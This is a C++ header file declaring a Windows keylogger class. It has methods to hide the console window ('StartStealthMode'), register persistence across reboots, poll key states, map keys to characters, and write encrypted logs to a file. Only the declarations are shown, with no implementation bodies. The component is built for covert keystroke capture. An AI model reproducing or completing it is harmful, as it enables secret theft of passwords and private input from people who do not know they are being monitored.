//   Author(s) : Narcis GRECU (narcisgrecu07@gmail.com)

#ifndef __KEY_LOGGER_H__
#define __KEY_LOGGER_H__

#include <string>
#include <fstream>

#include <Windows.h>

class KeyLogger
{
private:
	std::string OutPath;
	std::ofstream OutFile;
	int EncryptKey;

	HWND Console;


public:
	KeyLogger(std::string Path);

	bool StartStealthMode();
	void StartLogging();
	std::string GetChar(int Key, bool CapsIsPressed);
	void WriteMessage(std::string Message);
	bool RegisterPersistence();
	bool IsPressed(int Key);
	void EncryptMessage(std::string& Message);
};

#endif